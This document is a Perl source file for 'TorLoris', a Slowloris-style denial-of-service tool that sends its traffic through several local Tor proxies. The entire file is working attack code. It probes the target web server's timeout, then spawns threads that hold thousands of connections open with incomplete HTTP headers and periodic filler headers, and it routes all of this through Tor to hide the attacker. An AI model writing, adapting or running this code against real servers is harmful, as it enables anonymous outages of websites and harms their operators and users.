#!/bin/perl

##################TorLoris######################
# Based on the SlowLoris tool by Robert "RSnake" Hansen
# http://ha.ckers.org/slowloris/
######################

###########################Setup###########################
#Use the the strict package because...
use strict;
#Include the socket functions of PERL
use IO::Socket;
use IO::Socket::Socks;	
#Include threading package
use threads;
#Ignore sigs
$SIG{'PIPE'} = 'IGNORE'; 
######################END OF SETUP###########################

# Server info and port info. 
	my $server = shift || "127.0.0.1"; #Server IP address, using a URL may cause information leakage as the DNS query won't go through the socks proxy. 
	my $protoport = "80"; #Port of web server to attack
	my $sleeptimer; #A variable to hold a timer
	my $threadcon = 50; #The amount of loops per thread/
	my $concount = 10000; #The total number of connections
	my $socktimeout = 5; #Timeout value for the socks socket
	my $doesitwork; #Variable to a working/notworking thing
	my @timervalues = ( "2", "30", "90", "240", "500"); #Various values to be used when making connectons
	my @proxyaddress = ( "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1", "127.0.0.1" ); #The address of the proxy. 
	my @proxyportnums = ( "9051", "9052", "9053", "9054", "9055", "9056", "9057", "9058", "9059");
	my @socksver = ( "5", "5", "5", "5", "5", "5", "5", "5", "5" ); #Socks Version
# End of server info and port info.

#Randomize the first proxy to use for testing :)
my $firstrandomnumber = int( rand(9));

#Create connection to test delay
if (my $sock = IO::Socket::Socks->new(ProxyAddr => $proxyaddress[$firstrandomnumber],
					ProxyPort => $proxyportnums[$firstrandomnumber],
					ConnectAddr => $server,
					ConnectPort => $protoport,
					SocksVersion => $socksver[$firstrandomnumber],
					Timeout => $socktimeout) or die $SOCKS_ERROR ) {

	##If the connection works wee generate a http header with some junk as a get but miss the last new line and carridge return chars
	my $httprequest =" GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: $server\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
	
	##If we can send the header down the sock we created earlier
	if (print $sock $httprequest) {
		#Print a success message
		print "Successfull data send\r\n";
	} else {
		#print and unsuccessful massage
		print "unsuccessful data send, exiting\r\n";
		exit;
	}
	
	#Yes it does work
	$doesitwork = 1;

	#Timeout Calc function :)
	for (my $blarg = 0; $blarg <= $#timervalues; $blarg++) {
		#Print status message
		print "Testing $timervalues[$blarg] second delay\r\n";
		
		#Sleep for the timer values
		sleep($timervalues[$blarg]);
		
		#send an update to the webserver to test delay
		if ( print $sock "X-a: b\r\n" ) {
			#If it works, then the timeout can be this or less
			print "This timer worked\r\n";
			#Update the sleeptimer variable to contain the successful timer
			$sleeptimer = $timervalues[$blarg];
		} else {
			#if it doesn't work
			if ( $SIG{__WARN__} ) {
					#We fail it
					print "Failed timeout test at $timervalues[$blarg] :(\r\n";
					#and the timer = the previous value
					$sleeptimer = $timervalues[$blarg -1];

			}

			last;
		}
				
	}
	
	print "Will connect to $server on port $protoport every with a $sleeptimer timer on each socket\r\n";
	
} else {
	
	#no it doesn't work
	$doesitwork = 0;
	
	#lol
	print "FAILED\r\n";
	
}

#if the inital connection works
if ($doesitwork == 1) {

	#define some vars
	my @threads;
	
	my $proxyportnumber;
	
	my $torinstance = 0;
	
	my $proxycounter;
	
	my $inum;
	
	my $threadnumbervar = 1;
	
	#while < the total number of connections
	while ($inum < $concount) {
		
		#What tor instance is used?
		if ($torinstance == 0) {
				$proxycounter =1;
				$torinstance = 1;
		} elsif ($torinstance == 1) {
				$proxycounter =2;
				$torinstance = 2;
		} elsif ($torinstance == 2) {
				$proxycounter =3;
				$torinstance = 3;
		} elsif ($torinstance == 3) {
				$proxycounter =4;
				$torinstance = 4;
		} elsif ($torinstance == 4) {
				$proxycounter =5;
				$torinstance = 5;
		} elsif ($torinstance == 5) {
				$proxycounter =6;
				$torinstance = 6;
		} elsif ($torinstance == 6) {
				$proxycounter =7;
				$torinstance = 7;
		} elsif ($torinstance == 7) {
				$proxycounter =8;
				$torinstance = 8;
		} elsif ($torinstance == 8) {
				$proxycounter =0;
				$torinstance = 0;
		}
				
		#create a new thread for a connection loop that has all the relevent information
		$threads[$inum] = threads->create(\&connectionsub, $threadcon, $server, $protoport,$socktimeout, 'tcp', $sleeptimer, $proxyportnums[$proxycounter], $proxyaddress[$proxycounter], $socksver[$proxycounter], $threadnumbervar );
		#Thread online :)
		print "Thread $threadnumbervar ONLINE\r\n";
		#Add the threadcon value to the inum counter
		$inum = $inum + $threadcon;
		$threadnumbervar ++;
		
	}
	
	#Get all the threads into an array
	my @letussee = threads->list;
		#While the number of threads is greater than 0
	while ($#letussee > 0) {
		
	}
	print "Threads all dead :( \r\n";
	
} else {
	
	#no it doesn't work :(
	print "Does not work\r\n";
	
}

#Connection sub for doing the business
sub connectionsub {
	#define a bunch of vars
	my ($connum, $threadserver, $threadport, $threadtimeout, $threadproto, $threaddelaytime, $proxport, $proxaddr, $threadsockver, $threadconnumber) = @_;
	my @threadsock;
	my @threadworking;
	my @threadsock;
	my $xnum;

	#while always
	while (1) {
		
		print "Thread $threadconnumber Working\r\n";
				
		#For each xnum in the total connections per thread
		for $xnum (1 .. $connum) {
			#Generate a sock (and an if conditional)
			if ($threadsock[$xnum] = new IO::Socket::Socks( ProxyAddr => $proxaddr,
										ProxyPort => $proxport,
										ConnectAddr => $threadserver,
										ConnectPort => $threadport,
										SocksVersion => $threadsockver,
										Timeout => $threadtimeout ))
			{
				#Generate a request header
				my $threadrequest = " GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: $server\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
				
				#Put the sock in a filehandle
				my $threadhandle = $threadsock[$xnum];
				
				$threadworking[$xnum] = 1;
				
				#If the connection works
				if ($threadhandle) {
					
					#See what happens
					print $threadhandle "$threadrequest";
						if ( $SIG{__WARN__} ) {
							$threadworking[$xnum] = 0;
							close $threadhandle;
						} else {
							
							$threadworking[$xnum] = 1;
							
						}
						
				}
				
			} else {
				
				$threadworking[$xnum] = 0;
			}
		
		}
		
		for my $znum (1 .. $connum) {
			if ($threadworking[$znum] == 1) {
				if ($threadsock[$znum]) {
					
					my $threadhandle = $threadsock[$znum];
					
					if (print $threadhandle "X-a: b\r\n") {
						
						$threadworking[$znum] = 1;
						
					} else {
						
						$threadworking[$znum] = 0;
						
					}
						
				} else {
					
					$threadworking[$znum] - 0;
					
				}
			}
			
		}
		
		sleep($threaddelaytime);
		
	}
	
}
